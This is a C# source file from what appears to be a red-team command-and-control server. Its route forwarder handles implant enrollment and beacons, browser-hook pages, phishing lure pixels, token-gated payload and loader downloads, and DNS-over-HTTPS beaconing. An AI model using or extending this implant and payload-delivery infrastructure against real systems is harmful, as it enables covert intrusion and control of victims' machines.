using Microsoft.Extensions.Logging;
using Rod.Audit;
using Rod.CoreState.Campaigns;
using Rod.CoreState.Deployment;
using Rod.CoreState.Live;
using Rod.CoreState.Transports;
using Rod.Transport.Endpoints;
using Rod.Transport.Listeners.Dns;
using Rod.Transport.Listeners.Streams;

namespace Rod.Transport.Listeners.Bridge;

// The route-forward carriage's kernel half (ADR-025, the https shape): one
// duplex connection per medium peer carrying request/answer units --
// field maps, nothing positional -- dispatched by path. The routes are the
// implant family's own -- the JSON enroll exchange, the envelope contact,
// the web families' asset routes (hooks, lures, the payload and loader
// fetches), and the DNS grammar's RFC 8484 arm -- driven through the same
// cores the HTTP routes drive, so a contact that crossed the bridge is
// indistinguishable in core state, the audit trail, and the live bus from
// one that crossed Kestrel. The scope is the peer: this bridge belongs to
// one listener, known directly, no local port to resolve.
//
// The unit's observed facts (peer, ua, and whatever a later medium honestly
// observes) ride the map for the routes that audit by them. A request may
// carry headers as header-<lowercase-name> fields and an answer may answer
// them the same way -- the HTTP-header model the field map already keeps,
// so the browser-only CORS posture and the download disposition cross the
// bridge exactly as they cross Kestrel.

/// <summary>
/// Serves one route-forward connection: request units in, answer units
/// out, until the peer goes or the listener stops.
/// </summary>
internal sealed class BridgeRouteForwarder
{
    private readonly EnrollmentExchange _enrollment;
    private readonly EnvelopeContactCore _contact;
    private readonly IPayloadStore _payloads;
    private readonly IAuditStore _audit;
    private readonly ICampaignStore _campaigns;
    private readonly IDeployTokenService _tokens;
    private readonly ILiveEventBus _live;
    private readonly DnsBeaconBridge _dns;
    private readonly TimeProvider _clock;
    private readonly ILoggerFactory _loggerFactory;
    private readonly ILogger<BridgeRouteForwarder> _logger;

    public BridgeRouteForwarder(
        EnrollmentExchange enrollment,
        EnvelopeContactCore contact,
        IPayloadStore payloads,
        IAuditStore audit,
        ICampaignStore campaigns,
        IDeployTokenService tokens,
        ILiveEventBus live,
        DnsBeaconBridge dns,
        TimeProvider clock,
        ILoggerFactory loggerFactory,
        ILogger<BridgeRouteForwarder> logger)
    {
        _enrollment = enrollment;
        _contact = contact;
        _payloads = payloads;
        _audit = audit;
        _campaigns = campaigns;
        _tokens = tokens;
        _live = live;
        _dns = dns;
        _clock = clock;
        _loggerFactory = loggerFactory;
        _logger = logger;
    }

    public async Task ServeAsync(
        Stream stream,
        Listener listener,
        CancellationToken stoppingToken)
    {
        // The route carriage's identity fallback mirrors the HTTP route's:
        // an implant may stand by its handshake id alone when the front it
        // dialed is cleartext -- the lab posture. The front implants dial is
        // the listener's public endpoint, so its scheme decides.
        var cleartextFallback = !listener.PublicEndpoint.StartsWith(
            "https://", StringComparison.OrdinalIgnoreCase);

        while (!stoppingToken.IsCancellationRequested)
        {
            byte[] wire;
            try
            {
                wire = await StreamContactFraming.ReadMessageAsync(stream, stoppingToken);
            }
            catch (Exception ex) when (
                ex is IOException or OperationCanceledException or ObjectDisposedException
                or System.Net.Sockets.SocketException)
            {
                // The peer went or the listener is stopping: the connection
                // ends, and the peer's next request reconnects.
                return;
            }

            // A unit without its method and path is malformed -- the same
            // dropped connection every bridge shape keeps. The body is
            // optional-shaped (an empty POST is still a POST).
            if (!BridgeRouteProtocol.TryDecodeUnit(wire, out var request)
                || !request.TryGetValue(BridgeRouteProtocol.MethodKey, out var methodBytes)
                || !request.TryGetValue(BridgeRouteProtocol.PathKey, out var pathBytes))
                return;
            var method = System.Text.Encoding.UTF8.GetString(methodBytes);
            var path = System.Text.Encoding.UTF8.GetString(pathBytes);
            var body = request.TryGetValue(BridgeRouteProtocol.BodyKey, out var bodyBytes)
                ? bodyBytes
                : [];

            RouteAnswer answer;
            try
            {
                answer = await DispatchAsync(method, path, body, request, listener, cleartextFallback, stoppingToken);
            }
            catch (Exception ex) when (ex is OperationCanceledException or IOException)
            {
                return;
            }
            catch (Exception ex)
            {
                _logger.LogInformation(
                    ex, "Bridge route dispatch failed on listener {Name} for {Path}.", listener.Name, path);
                answer = new RouteAnswer(
                    502, "application/json; charset=utf-8",
                    ProblemBytes("The forwarded request could not be served."), null);
            }

            try
            {
                await StreamContactFraming.WriteMessageAsync(
                    stream, EncodeAnswer(answer), stoppingToken);
            }
            catch (Exception ex) when (
                ex is IOException or OperationCanceledException or ObjectDisposedException
                or System.Net.Sockets.SocketException)
            {
                return;
            }
        }
    }

    private async Task<RouteAnswer> DispatchAsync(
        string method,
        string path,
        byte[] body,
        IReadOnlyDictionary<string, byte[]> request,
        Listener listener,
        bool cleartextFallback,
        CancellationToken cancellationToken)
    {
        var facts = WireFactsOf(request, listener);

        if (string.Equals(method, BridgeRouteProtocol.MethodPost, StringComparison.Ordinal)
            && string.Equals(path, "/implants/enroll", StringComparison.Ordinal))
        {
            var enroll = await _enrollment.HandleAsync(body, listener, cancellationToken);
            // The browser-hook posture (architecture.md Sec 8): a hooked
            // page's fetches are cross-origin, and the browser-only CORS
            // answer rides when and only when the request carried Origin.
            return new RouteAnswer(
                enroll.Status, enroll.ContentType, enroll.Body, CrossOriginHeaders(facts.Origin));
        }

        if (string.Equals(method, BridgeRouteProtocol.MethodPost, StringComparison.Ordinal)
            && string.Equals(path, "/implants/beacon", StringComparison.Ordinal))
        {
            var contact = await _contact.ContactAsync(
                body,
                new EnvelopeContactOptions(
                    EnvelopeBeaconContact.MaxDispatchBytes,
                    TransportCapabilities.Envelope,
                    "bridge",
                    CleartextIdentityFallback: cleartextFallback,
                    Enrollment: new EnvelopeEnrollmentContext(listener)),
                cancellationToken);
            return contact.Status switch
            {
                200 => new RouteAnswer(
                    200,
                    contact.Sealed ? "text/plain; charset=utf-8" : "application/octet-stream",
                    contact.Body,
                    CrossOriginHeaders(facts.Origin)),
                401 => new RouteAnswer(401, "application/json; charset=utf-8", ProblemBytes(contact.Problem ?? "The contact was refused."), null),
                413 => new RouteAnswer(413, "application/octet-stream", [], null),
                _ => new RouteAnswer(400, "application/json; charset=utf-8", ProblemBytes(contact.Problem ?? "The request body was refused."), null),
            };
        }

        // The web families' asset routes (the https package's forwarding
        // arms): the same cores the HTTP routes drive, scoped by this
        // bridge's own listener -- no port to resolve.
        if (string.Equals(method, BridgeRouteProtocol.MethodGet, StringComparison.Ordinal))
        {
            if (path.StartsWith("/implants/hooks/", StringComparison.Ordinal)
                && TryRouteId(path, "/implants/hooks/", suffix: "/page", out var hookId, out var hookPage))
            {
                var served = await HookServingCore.ServeAsync(
                    hookId, hookPage, listener, facts, _payloads, _audit, _clock, cancellationToken);
                return AnswerOf(served);
            }

            if (path.StartsWith("/implants/lures/", StringComparison.Ordinal)
                && TryRouteId(path, "/implants/lures/", suffix: "/open", out var lureId, out var pixel))
            {
                var served = await LureServingCore.ServeAsync(
                    lureId, pixel, listener, facts, _campaigns, _payloads, _audit, _live, _clock, cancellationToken);
                return AnswerOf(served);
            }

            if (path.StartsWith("/implants/payloads/", StringComparison.Ordinal)
                && TryRouteId(path, "/implants/payloads/", suffix: null, out var payloadId, out _))
            {
                var served = await PayloadFetchCore.ServeAsync(
                    payloadId, Header(request, "header-x-deploy-token") ?? "", loaderTier: false,
                    listener, facts, _tokens, _payloads, _audit, _live, _clock, cancellationToken);
                return AnswerOf(served);
            }

            if (path.StartsWith("/implants/loaders/", StringComparison.Ordinal)
                && path.EndsWith("/payload", StringComparison.Ordinal))
            {
                var idText = path["/implants/loaders/".Length..^"/payload".Length];
                if (Guid.TryParse(idText, out var loaderId))
                {
                    var served = await PayloadFetchCore.ServeAsync(
                        loaderId, Header(request, "header-x-deploy-token") ?? "", loaderTier: true,
                        listener, facts, _tokens, _payloads, _audit, _live, _clock, cancellationToken);
                    return AnswerOf(served);
                }
                return new RouteAnswer(400, "application/json; charset=utf-8", ProblemBytes("Payload id is not a valid identifier."), null);
            }
        }

        // The DNS grammar's RFC 8484 arm (the doh shape): the body is the
        // DNS wire message, whatever carriage brought it -- an HTTP body or
        // a UDP datagram the medium front decoded. The carriage changes;
        // the answer never does (DnsContactAnswerer, the same core the UDP
        // listener and the in-tree DoH route drive).
        if (string.Equals(method, BridgeRouteProtocol.MethodPost, StringComparison.Ordinal)
            && string.Equals(path, "/dns-query", StringComparison.Ordinal))
        {
            var answerer = new DnsContactAnswerer(
                listener, _dns, _loggerFactory.CreateLogger("Rod.Transport.DnsOverHttps"));
            var response = await answerer.AnswerAsync(body, cancellationToken);
            return new RouteAnswer(200, "application/dns-message", response, null);
        }

        return new RouteAnswer(404, "application/json; charset=utf-8", ProblemBytes("No such route on this listener's bridge."), null);
    }

    // One dispatch's answer: the status, the type, the body, and the
    // posture's headers, carried onto the wire as header-<name> fields.
    private readonly record struct RouteAnswer(
        int Status,
        string ContentType,
        byte[] Body,
        IReadOnlyDictionary<string, string>? Headers = null);

    private static RouteAnswer AnswerOf(ServedRoute served)
    {
        var headers = new Dictionary<string, string>(served.Headers, StringComparer.OrdinalIgnoreCase);
        if (served.FileName is { } fileName)
            headers["Content-Disposition"] = $"attachment; filename={fileName}";
        return new RouteAnswer(
            served.Status,
            served.ContentType ?? "application/octet-stream",
            served.Body,
            headers);
    }

    // The browser-only CORS posture on the bridge, the HTTP route's own:
    // answered only when the request carried Origin, carried as the same
    // header field the HTTP response writes.
    private static IReadOnlyDictionary<string, string> CrossOriginHeaders(string? origin)
        => origin is { Length: > 0 }
            ? new Dictionary<string, string>(StringComparer.Ordinal)
            {
                ["Access-Control-Allow-Origin"] = "*",
            }
            : [];

    // The wire facts a request unit honestly observed: the peer and user
    // agent the carriage names, the browser-only Origin, and the listener
    // fact the audit payloads name this bridge's ingress by.
    private static RouteWireFacts WireFactsOf(
        IReadOnlyDictionary<string, byte[]> request, Listener listener)
        => new(
            Header(request, BridgeRouteProtocol.PeerKey) ?? "unknown",
            Header(request, BridgeRouteProtocol.UserAgentKey) ?? "",
            Header(request, "header-origin"),
            $"listenerBridge={listener.Id.Value:N}");

    private static string? Header(IReadOnlyDictionary<string, byte[]> request, string key)
        => request.TryGetValue(key, out var value)
            ? System.Text.Encoding.UTF8.GetString(value)
            : null;

    // Parses /prefix/{id} and /prefix/{id}/{suffix}: the capability-URL ids
    // the serving routes address by.
    private static bool TryRouteId(
        string path, string prefix, string? suffix, out Guid id, out bool suffixPresent)
    {
        id = default;
        suffixPresent = false;
        var rest = path[prefix.Length..];
        if (suffix is { } tail)
        {
            if (!rest.EndsWith(tail, StringComparison.Ordinal))
                return false;
            rest = rest[..^tail.Length];
            suffixPresent = true;
        }
        return Guid.TryParse(rest, out id);
    }

    private static byte[] EncodeAnswer(RouteAnswer answer)
    {
        var fields = new List<KeyValuePair<string, byte[]>>(3 + (answer.Headers?.Count ?? 0))
        {
            KeyValuePair.Create(
                BridgeRouteProtocol.StatusKey,
                System.Text.Encoding.ASCII.GetBytes(
                    answer.Status.ToString(System.Globalization.CultureInfo.InvariantCulture))),
            KeyValuePair.Create(BridgeRouteProtocol.ContentTypeKey, System.Text.Encoding.UTF8.GetBytes(answer.ContentType)),
            KeyValuePair.Create(BridgeRouteProtocol.BodyKey, answer.Body),
        };
        if (answer.Headers is not null)
            foreach (var (name, value) in answer.Headers)
            {
                fields.Add(KeyValuePair.Create(
                    BridgeRouteProtocol.HeaderPrefix + name.ToLowerInvariant(),
                    System.Text.Encoding.UTF8.GetBytes(value)));
            }
        return BridgeRouteProtocol.EncodeUnit(fields);
    }

    private static byte[] ProblemBytes(string problem)
        => System.Text.Json.JsonSerializer.SerializeToUtf8Bytes(
            new Problem(problem), System.Text.Json.JsonSerializerOptions.Web);
}
